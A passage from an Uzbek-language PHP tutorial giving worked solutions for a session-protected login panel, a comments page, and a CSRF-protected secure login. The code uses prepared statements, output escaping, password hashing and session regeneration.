        $_SESSION['kirgan'] = true;
        $_SESSION['login'] = $u['login'];
        header("Location: panel.php"); exit;
    }
    $xato = "Login yoki parol xato";
}
?>
<form method="post">
    <input name="login" placeholder="Login">
    <input type="password" name="parol" placeholder="Parol">
    <button>Kirish</button>
</form>
<p style="color:red"><?= htmlspecialchars($xato ?? "") ?></p>
```
```php
<?php
// 3) panel.php — himoyalangan sahifa
session_start();
if (empty($_SESSION['kirgan'])) { header("Location: login.php"); exit; }
?>
<h1>Panel</h1>
<p>Xush kelibsiz, <?= htmlspecialchars($_SESSION['login']) ?>!</p>
<a href="chiqish.php">Chiqish</a>
```
```php
<?php
// 4) chiqish.php
session_start();
session_destroy();
header("Location: login.php");
```
Bu — to'liq, xavfsiz tizim: parol **hashlab** saqlanadi (`password_hash`), tekshirishda `password_verify`, login muvaffaqiyatli bo'lganda `session_regenerate_id(true)` (session fixation'dan), barcha so'rovlar **prepared statement**, chiqarishda `htmlspecialchars`, sahifa sessiya bilan **himoyalangan**. 4-QISMda o'rgangan hamma narsa shu yerda birlashdi.
</details>

<details markdown="1">
<summary>Yechim — 15 (xavfsiz izohlar tizimi)</summary>

`izohlar` jadvali: `id`, `matn`, `sana`. Bitta fayl izohni qo'shadi va ko'rsatadi:

```php
<?php
// izohlar.php
require 'ulanish.php';

// Yangi izoh qo'shish (prepared — SQL injection'dan himoya)
if (!empty($_POST['matn'])) {
    $stmt = $pdo->prepare("INSERT INTO izohlar (matn) VALUES (?)");
    $stmt->execute([trim($_POST['matn'])]);
    header("Location: izohlar.php");
    exit;
}

$izohlar = $pdo->query("SELECT * FROM izohlar ORDER BY id DESC")->fetchAll();
?>

<form method="post">
    <textarea name="matn" required></textarea>
    <button>Yuborish</button>
</form>

<?php foreach ($izohlar as $izoh): ?>
    <!-- htmlspecialchars — XSS'dan himoya: <script> kod sifatida ishlamaydi -->
    <p><?= htmlspecialchars($izoh['matn']) ?></p>
<?php endforeach; ?>
```
Ikki himoya birga: izoh **prepared statement** bilan saqlanadi (SQL injection'dan), va **`htmlspecialchars`** bilan ko'rsatiladi (XSS'dan — kimdir `<script>` yozsa, u kod emas, oddiy matn bo'lib chiqadi). Foydalanuvchi ma'lumoti bilan ishlaganda bu ikkisi — majburiy odat.
</details>

<details markdown="1">
<summary>Yechim — 16 (CSRF himoyalangan izohlar tizimi)</summary>

Avval `Csrf` yordamchi sinfini yozamiz (alohida `csrf.php` faylida), keyin uni izohlar formasiga qo'shamiz:

```php
<?php
// csrf.php — qayta ishlatiladigan CSRF yordamchisi
final class Csrf
{
    public static function token(): string
    {
        if (empty($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }

    public static function input(): string
    {
        $t = htmlspecialchars(self::token());
        return '<input type="hidden" name="csrf_token" value="' . $t . '">';
    }

    public static function tekshir(?string $yuborilgan): bool
    {
        return !empty($_SESSION['csrf_token'])
            && is_string($yuborilgan)
            && hash_equals($_SESSION['csrf_token'], $yuborilgan);
    }
}
```
```php
<?php
// izohlar.php — endi CSRF himoyasi bilan
session_start();
require 'ulanish.php';
require 'csrf.php';

if (!empty($_POST['matn'])) {
    // CSRF tekshiruvi — soxta so'rovlardan himoya
    if (!Csrf::tekshir($_POST['csrf_token'] ?? null)) {
        die("So'rov rad etildi.");
    }
    $stmt = $pdo->prepare("INSERT INTO izohlar (matn) VALUES (?)");
    $stmt->execute([trim($_POST['matn'])]);
    header("Location: izohlar.php");
    exit;
}

$izohlar = $pdo->query("SELECT * FROM izohlar ORDER BY id DESC")->fetchAll();
?>

<form method="post">
    <?= Csrf::input() ?>
    <textarea name="matn" required></textarea>
    <button>Yuborish</button>
</form>

<?php foreach ($izohlar as $izoh): ?>
    <p><?= htmlspecialchars($izoh['matn']) ?></p>
<?php endforeach; ?>
```
Endi izohlar tizimida **uchta** himoya birga: prepared statement (SQL injection), `htmlspecialchars` (XSS) va `Csrf::tekshir` (CSRF). `Csrf::input()` formaga yashirin tokenni qo'yadi, `Csrf::tekshir` esa uni timing-safe tekshiradi. Yordamchi sinf tufayli kod toza va qayta ishlatiladigan bo'ldi.
</details>

<details markdown="1">
<summary>Yechim — 17 (to'liq xavfsiz login — barcha himoya birga)</summary>

```php
<?php
// xavfsiz-login.php
session_start();
require 'ulanish.php';

// CSRF token (forma uchun)
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

$xato = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 1) CSRF himoyasi (timing-safe)
    if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
        die("So'rov rad etildi.");
    }

    // 2) Validatsiya
    $login = trim($_POST['login'] ?? '');
    if ($login === '') {
        $xato = "Login bo'sh bo'lmasin";
    } else {
        // 3) Prepared statement (SQL injection'dan)
        $stmt = $pdo->prepare("SELECT * FROM foydalanuvchilar WHERE login = ?");
        $stmt->execute([$login]);
        $u = $stmt->fetch();

        // 4) password_verify
        if ($u && password_verify($_POST['parol'], $u['parol'])) {
            // 5) session fixation oldini olish
            session_regenerate_id(true);

            // 6) Hash eskirgan bo'lsa — jimgina yangilash
            if (password_needs_rehash($u['parol'], PASSWORD_DEFAULT)) {
                $yangi = password_hash($_POST['parol'], PASSWORD_DEFAULT);
                $upd = $pdo->prepare("UPDATE foydalanuvchilar SET parol = ? WHERE id = ?");
                $upd->execute([$yangi, $u['id']]);
            }

            $_SESSION['kirgan'] = true;
            $_SESSION['login'] = $u['login'];
            header("Location: panel.php"); exit;
        }
        // Qaysi biri xato ekanini aytmaymiz (yomon niyatga yordam bermaymiz)
        $xato = "Login yoki parol xato";
    }
}
?>
<form method="post">
    <input type="hidden" name="csrf_token"
           value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
    <input name="login" placeholder="Login">
    <input type="password" name="parol" placeholder="Parol">
    <button>Kirish</button>
</form>
<p style="color:red"><?= htmlspecialchars($xato) ?></p>
```
Mana — bitta faylda **oltita himoya qatlami**: CSRF token (`hash_equals`), validatsiya, prepared statement, `password_verify`, `session_regenerate_id(true)` (session fixation), `password_needs_rehash` (parolni avtomatik zamonaviylashtirish). Bundan tashqari xato xabari "login yoki parol xato" — qaysi biri ekanini oshkor qilmaydi. Bu — haqiqiy, ishlab chiqarishga (production) tayyor login namunasi.
</details>
</content>
</invoke>
